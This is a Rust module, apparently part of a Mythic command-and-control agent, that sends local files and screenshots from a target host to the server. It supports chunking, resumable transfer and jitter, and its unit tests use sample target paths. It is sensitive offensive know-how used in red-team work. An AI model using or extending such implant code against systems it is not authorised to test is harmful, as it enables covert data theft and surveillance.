//! # 本地物理文件传输与屏幕截图业务模块 (File & Screenshot Transfer Adapter)
//!
//! ## 架构分层定位 (Tier 3: 业务适配层)
//!
//! 1. **专注于本地文件与操作系统 I/O**：
//!    - 维护本地文件路径 (`full_path`)、显示文件名 (`filename`) 与来源主机 (`host`)；
//!    - 负责屏幕截图标记 (`is_screenshot: true`) 路由；
//!    - 处理本地物理文件句柄 (`Read + Seek`) 与底层 I/O 错误映射。
//! 2. **内部组合通用传输引擎 ([`TransferSession`])**：
//!    - 将所有 Mythic 4.0 纯字节偏移 (0-based Offset) 协议、传输前握手注册、断点续传握手 (Resume)、
//!      以及基于 [`crate::protocol::StackWorkspace4K`] 的纯栈数据泵送，全权委托给 [`crate::stream::TransferSession`]。
//! 3. **100% 零堆纯栈契约 (Zero-Heap OPSEC)**：
//!    - 路径与名称仅借用 (`&'a str`)，文件 UUID 栈数组自持 (`[u8; 36]`)，无任何动态堆分配。

pub use crate::error::FileTransferError;
use crate::protocol::{
    ActiveStackWorkspace, FileDownloadResponse, ServerTaskPostResponseItem, TaskResponseItem,
};
pub use crate::stream::{ZeroRead, ZeroSeek, ZeroWrite};
pub use crate::transfer::{
    TransferReceiveSession, TransferRegisterMeta, TransferSession, TransferSource,
};

/// 本地物理文件接收与落盘会话 (Mythic -> Agent 文件下发与落盘)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileReceiveSession<'a> {
    pub session: TransferReceiveSession<'a>,
}

pub type UploadSession<'a> = FileReceiveSession<'a>;

impl<'a> FileReceiveSession<'a> {
    #[inline]
    pub fn new(
        task_id: &'a str,
        file_id_str: &str,
        chunk_size: u32,
        full_path: Option<&'a str>,
    ) -> Result<Self, FileTransferError> {
        Ok(Self {
            session: TransferReceiveSession::new(task_id, file_id_str, chunk_size, full_path)?,
        })
    }
}

// ==========================================
// 本地物理文件下载/外发会话包装器
// ==========================================

/// 本地物理文件下载/外发会话 (组合通用 TransferSession)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileDownloadSession<'a> {
    /// 目标文件本地完整路径 (借用自任务下发参数，如 `Some("C:\\Windows\\Temp\\data.bin")`)
    pub full_path: Option<&'a str>,
    /// 显示文件名 (借用，如 `Some("data.bin")`)
    pub filename: Option<&'a str>,
    /// 来源主机名称 (借用，可选)
    pub host: Option<&'a str>,
    /// 是否作为屏幕截图归档 (默认 false；若为 true 则 Mythic 自动路由到专有截图查看器)
    pub is_screenshot: bool,
    /// 内嵌的通用传输会话状态机
    pub session: TransferSession<'a>,
}

/// 保持向后兼容别名
pub type DownloadSession<'a> = FileDownloadSession<'a>;

impl<'a> FileDownloadSession<'a> {
    /// 创建新的文件下载外发会话
    ///
    /// * `task_id`: 触发该外发的任务 UUID
    /// * `full_path`: 本地文件绝对路径 (可选)
    /// * `filename`: 显示文件名 (可选)
    /// * `total_size`: 文件总字节数 (未知可传 -1)
    #[inline]
    pub const fn new(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
    ) -> Self {
        Self {
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            session: TransferSession::new(task_id, total_size),
        }
    }

    /// 设置来源主机名 (可选)
    #[inline]
    pub const fn with_host(mut self, host: Option<&'a str>) -> Self {
        self.host = host;
        self
    }

    /// 设置是否标记为屏幕截图
    #[inline]
    pub const fn with_screenshot(mut self, is_screenshot: bool) -> Self {
        self.is_screenshot = is_screenshot;
        self
    }

    /// 使用已有定长 36 字节 file_id 创建会话 (用于从持久化记录或崩溃后恢复断点续传)
    #[inline]
    pub const fn new_with_file_id(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
        file_id: [u8; 36],
        current_offset: u64,
    ) -> Self {
        Self {
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            session: TransferSession::new_with_transfer_id(
                task_id,
                total_size,
                file_id,
                current_offset,
            ),
        }
    }

    // ----------------- 属性代理 -----------------

    #[inline(always)]
    pub fn task_id(&self) -> &'a str {
        self.session.task_id
    }

    #[inline(always)]
    pub fn current_offset(&self) -> u64 {
        self.session.current_offset
    }

    #[inline(always)]
    pub fn total_size(&self) -> i64 {
        self.session.total_size
    }

    #[inline(always)]
    pub fn is_complete(&self) -> bool {
        self.session.is_complete
    }

    #[inline(always)]
    pub fn is_resumed(&self) -> bool {
        self.session.is_resumed
    }

    #[inline(always)]
    pub fn file_id_str(&self) -> Option<&str> {
        self.session.transfer_id_str()
    }

    #[inline(always)]
    pub fn update_total_size(&mut self, new_size: i64) {
        self.session.update_total_size(new_size);
    }

    #[inline(always)]
    pub fn mark_complete(&mut self) {
        self.session.mark_complete();
    }

    // ----------------- 步骤 1: 构造注册元数据与注册报文 -----------------

    /// 提取注册元数据
    #[inline]
    pub fn register_meta(&self) -> TransferRegisterMeta<'a> {
        TransferRegisterMeta {
            total_size: self.session.total_size,
            filename: self.filename,
            full_path: self.full_path,
            host: self.host,
            is_screenshot: self.is_screenshot,
        }
    }

    /// 构造首次注册请求载荷
    #[inline]
    pub fn build_registration_response(&self) -> FileDownloadResponse<'a> {
        self.session.build_register_payload(self.register_meta())
    }

    /// 构造包含注册请求的顶层 TaskResponseItem
    #[inline]
    pub fn build_registration_task_response(&self) -> TaskResponseItem<'a> {
        self.session.build_register_task_response(self.register_meta())
    }

    /// 处理服务端注册回执
    #[inline]
    pub fn handle_registration_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<&str, FileTransferError> {
        self.session.handle_register_ack(resp)
    }

    // ----------------- 步骤 2: 切片 ACK 确认 -----------------

    /// 处理服务端切片确认
    #[inline]
    pub fn handle_chunk_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        self.session.handle_chunk_ack(resp)
    }

    // ----------------- 步骤 3: 断点续传 -----------------

    /// 构造断点续传请求
    #[inline]
    pub fn build_resume_request(&self) -> Result<FileDownloadResponse<'_>, FileTransferError> {
        self.session.build_resume_payload()
    }

    /// 构造断点续传顶层 TaskResponseItem
    #[inline]
    pub fn build_resume_task_response(&self) -> Result<TaskResponseItem<'_>, FileTransferError> {
        self.session.build_resume_task_response()
    }

    /// 处理断点续传确认回执
    #[inline]
    pub fn handle_resume_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        self.session.handle_resume_ack(resp)
    }

    // ----------------- 步骤 4: 结合文件句柄与 ActiveStackWorkspace 读取分片 -----------------

    /// 从文件句柄中读取带 Jitter 的分片并封包
    #[inline]
    pub fn read_next_chunk_file<'buf, 'sess, R>(
        &'sess mut self,
        reader: &mut R,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        self.session.pump_file_chunk(reader, workspace, use_jitter)
    }

    /// 统一从多态数据源中读取分片
    #[inline]
    pub fn read_next_chunk<'buf, 'sess, 'src, R>(
        &'sess mut self,
        source: &mut TransferSource<'src, R>,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        self.session.pump_next_chunk(source, workspace, use_jitter)
    }

    /// 便捷方法：从内存切片中读取分片
    #[inline]
    pub fn read_next_chunk_slice<'buf, 'sess>(
        &'sess mut self,
        slice: &[u8],
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        'buf: 'sess,
    {
        self.session.pump_slice_chunk(slice, workspace, use_jitter)
    }
}

// ==========================================
// 单元测试
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::ActiveBudget;
    use std::io::Cursor;

    #[test]
    fn test_file_download_session_lifecycle_and_resume() {
        let mut session = FileDownloadSession::new(
            "task-file-1",
            Some("C:\\Windows\\Temp\\agent.bin"),
            Some("agent.bin"),
            6000,
        )
        .with_host(Some("PC-TARGET"))
        .with_screenshot(true);

        // 1. 验证注册报文与截图路由标记
        let reg = session.build_registration_response();
        assert_eq!(reg.total_size, Some(6000));
        assert_eq!(reg.filename, Some("agent.bin"));
        assert_eq!(reg.full_path, Some("C:\\Windows\\Temp\\agent.bin"));
        assert_eq!(reg.host, Some("PC-TARGET"));
        assert_eq!(reg.is_screenshot, Some(true));

        let task_resp = session.build_registration_task_response();
        assert_eq!(task_resp.task_id, "task-file-1");
        assert!(task_resp.download.is_some());

        // 2. 模拟服务端下发 36 字节 UUID
        let sample_uuid = "22223333-4444-5555-6666-777788889999";
        let reg_ack = ServerTaskPostResponseItem {
            task_id: "task-file-1",
            status: "success",
            file_id: Some(sample_uuid),
            ..Default::default()
        };
        let file_id = session.handle_registration_ack(&reg_ack).unwrap();
        assert_eq!(file_id, sample_uuid);
        assert_eq!(session.file_id_str(), Some(sample_uuid));

        // 3. 模拟使用 ActiveStackWorkspace 发送分片
        let mut fake_file = vec![0x77u8; 100_000];
        let mut cursor = Cursor::new(&mut fake_file[..]);
        let mut workspace = ActiveStackWorkspace::new();

        let (chunk1, bytes1) = session
            .read_next_chunk_file(&mut cursor, &mut workspace, true)
            .unwrap();
        assert_eq!(chunk1.chunk_offset, Some(0));
        assert!(bytes1 >= ActiveBudget::min_raw_read().min(session.total_size() as usize));
        assert_eq!(bytes1 % 3, 0);
        assert_eq!(session.current_offset(), bytes1 as u64);

        // 4. 模拟断点续传
        let resume_req = session.build_resume_request().unwrap();
        assert_eq!(resume_req.file_id, Some(sample_uuid));
        assert_eq!(resume_req.resume, Some(true));

        let resume_ack = ServerTaskPostResponseItem {
            task_id: "task-file-1",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(3000),
            total_size: Some(6000),
            ..Default::default()
        };
        let resumed_off = session.handle_resume_ack(&resume_ack).unwrap();
        assert_eq!(resumed_off, 3000);
        assert_eq!(session.current_offset(), 3000);
        assert!(session.is_resumed());
    }

    #[test]
    fn test_file_download_session_full_stream() {
        let mut fake_file = [0xAAu8; 3500];
        let mut cursor = Cursor::new(&mut fake_file[..]);

        let sample_uuid = "ffffffff-eeee-dddd-cccc-bbbbbbbbbaaa";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());

        let mut session = FileDownloadSession::new_with_file_id(
            "task-full",
            Some("C:\\Data\\log.txt"),
            Some("log.txt"),
            3500,
            uuid_arr,
            0,
        );

        let mut workspace = ActiveStackWorkspace::new();

        while !session.is_complete() {
            let (chunk, bytes) = session
                .read_next_chunk_file(&mut cursor, &mut workspace, false)
                .unwrap();
            assert!(bytes > 0);
            assert!(chunk.chunk_offset.is_some());
        }

        assert_eq!(session.current_offset(), 3500);
        assert!(session.is_complete());
    }
}
